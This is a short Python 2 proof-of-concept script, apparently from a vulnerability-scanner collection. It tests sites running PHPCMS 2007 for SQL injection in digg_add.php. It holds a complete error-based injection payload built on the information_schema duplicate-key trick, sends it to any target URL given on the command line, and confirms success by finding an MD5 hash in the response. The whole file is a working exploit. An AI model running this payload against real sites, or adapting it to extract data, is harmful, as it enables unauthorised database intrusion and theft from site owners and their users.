#encoding=UTF-8
#!/usr/bin/env python
# coding=utf-8
import sys
import requests
def scan(target):
    info = {
    'name':u'PHPCMS 2007 digg_add.php注入',
    'date':'2014-11-30',
    'author':'0x0F',
    'poc':'/digg/digg_add.php?id=1&con=2&digg_mod=digg_data WHERE 1=2 +and(select 1 from(select count(*),concat((select (select (select concat(0x7e,md5(3.1415),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23'
    }
    headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0',
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    }
    audit_request = requests.get(target + info['poc'],headers=headers)
    audit_request.close()
    if audit_request.status_code == 200:
        if audit_request.text.find('63e1f04640e83605c1d177544a5a0488') !=-1:
            print u'[!]audit success'
            print '[*]' + target + info['poc']
        else:
            print u'[!]audit error'
    else:
        print 'connection error'
if __name__ == '__main__':
    if len(sys.argv) < 2:
        print "Usage: python phpcms_digg_add_php_sqli.py [target]\n"
        print "Example: python phpcms_digg_add_php_sqli.py  http://www.xxx.com\n"
        sys.exit(1)
    else:
        target = sys.argv[1].lower()
    scan(target)

